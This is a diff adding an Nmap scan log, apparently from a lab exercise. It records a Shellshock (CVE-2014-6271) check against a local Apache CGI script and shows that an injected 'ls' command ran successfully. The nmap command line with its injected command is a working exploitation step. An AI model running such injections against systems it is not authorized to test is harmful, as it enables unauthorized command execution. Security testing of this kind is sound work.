@@ -1,0 +1,27 @@
+# Nmap 7.80 scan initiated Wed Jan 29 02:23:15 2020 as: nmap -oN shellshock-scan -sV -p 8081 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000081s latency).
+
+PORT     STATE SERVICE VERSION
+8081/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+|       is executing commands injected via malicious HTTP headers.
+|             
+|     Disclosure date: 2014-09-24
+|     Exploit results:
+|       user.sh
+|   
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+|       http://seclists.org/oss-sec/2014/q3/685
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jan 29 02:23:26 2020 -- 1 IP address (1 host up) scanned in 11.27 seconds
